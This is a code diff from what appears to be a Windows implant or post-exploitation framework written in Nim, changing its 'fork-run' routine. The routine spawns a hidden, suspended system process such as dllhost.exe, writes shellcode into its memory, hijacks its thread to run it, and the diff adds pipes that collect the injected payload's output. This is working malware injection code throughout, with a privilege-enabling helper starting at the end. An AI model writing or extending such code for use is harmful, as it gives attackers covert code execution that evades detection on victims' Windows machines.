@@ -810,18 +810,36 @@ when defined(windows):
                 sys & "\\System32\\dllhost.exe",
                 sys & "\\System32\\WerFault.exe"]:
         if fileExists(c): procPath = c; break
-    var si: STARTUPINFOW
-    si.cb = DWORD(sizeof(si))
+
+    var sa = SECURITY_ATTRIBUTES(nLength: DWORD(sizeof(SECURITY_ATTRIBUTES)),
+                                  bInheritHandle: TRUE)
+    var outRd, outWr: HANDLE
+    let piped = CreatePipe(addr outRd, addr outWr, addr sa, 0) != 0
+    if piped: discard SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0)
+
+    var si = STARTUPINFOW(cb: DWORD(sizeof(STARTUPINFOW)),
+                          dwFlags: STARTF_USESHOWWINDOW)
+    if piped:
+      si.dwFlags = si.dwFlags or STARTF_USESTDHANDLES
+      si.hStdInput  = 0
+      si.hStdOutput = outWr
+      si.hStdError  = outWr
+
     var pi: PROCESS_INFORMATION
     var cmdW = newWideCString(procPath)
-    if callCreateProcessW(nil, cmdW, nil, nil, WINBOOL(0), CREATE_SUSPENDED,
+    if callCreateProcessW(nil, cmdW, nil, nil, WINBOOL(if piped: 1 else: 0),
+                          CREATE_SUSPENDED or CREATE_NO_WINDOW,
                           nil, nil, addr si, addr pi) == 0:
+      if piped: discard CloseHandle(outRd); discard CloseHandle(outWr)
       return "CreateProcessW(" & procPath & ") failed (err " & $GetLastError() & ")"
+    if piped: discard CloseHandle(outWr) # parent closes write end → EOF when child exits
+
     let mem = callVirtualAllocEx(pi.hProcess, nil, SIZE_T(sc.len),
                                   MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
     if mem == nil:
       discard TerminateProcess(pi.hProcess, 1)
       discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+      if piped: discard CloseHandle(outRd)
       return "VirtualAllocEx failed"
     var wr: SIZE_T
     discard callWriteProcessMemory(pi.hProcess, mem,
@@ -834,10 +852,48 @@ when defined(windows):
       ctx.Rip = cast[DWORD64](mem)
       discard callSetThreadContext(pi.hThread, addr ctx)
     discard ResumeThread(pi.hThread)
-    let res = "[+] fork-run: " & $sc.len & " B shellcode in " & procPath &
-              " (PID=" & $pi.dwProcessId & ")"
-    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
-    return res
+    discard CloseHandle(pi.hThread)
+
+    if not piped:
+      discard CloseHandle(pi.hProcess)
+      return "[+] fork-run: " & $sc.len & " B shellcode in " & procPath &
+             " (PID=" & $pi.dwProcessId & ")"
+
+    # Drain stdout/stderr with 60s timeout
+    var output: string
+    var buf: array[8192, byte]
+    let deadline = GetTickCount() + DWORD(60_000)
+    while GetTickCount() < deadline:
+      var avail: DWORD = 0
+      if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0: break
+      if avail > 0:
+        var nRead: DWORD
+        discard ReadFile(outRd, addr buf[0], min(avail, DWORD(sizeof(buf))), addr nRead, nil)
+        if nRead > 0:
+          let start = output.len
+          output.setLen(start + int(nRead))
+          copyMem(addr output[start], addr buf[0], int(nRead))
+      else:
+        if WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT:
+          while true:
+            avail = 0
+            if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0 or avail == 0: break
+            var nRead: DWORD
+            discard ReadFile(outRd, addr buf[0], min(avail, DWORD(sizeof(buf))), addr nRead, nil)
+            if nRead > 0:
+              let start = output.len
+              output.setLen(start + int(nRead))
+              copyMem(addr output[start], addr buf[0], int(nRead))
+          break
+    discard CloseHandle(outRd)
+    let timedOut = GetTickCount() >= deadline
+    if timedOut:
+      discard TerminateProcess(pi.hProcess, 1)
+      output.add("\n[!] fork-run: timed out (60s)")
+    discard WaitForSingleObject(pi.hProcess, 5000)
+    discard CloseHandle(pi.hProcess)
+    if output.len == 0: return "(no output)"
+    return output
 
   # ── Privilege helper ─────────────────────────────────────────────────────────
   proc enablePriv(hToken: HANDLE; privName: string): bool =
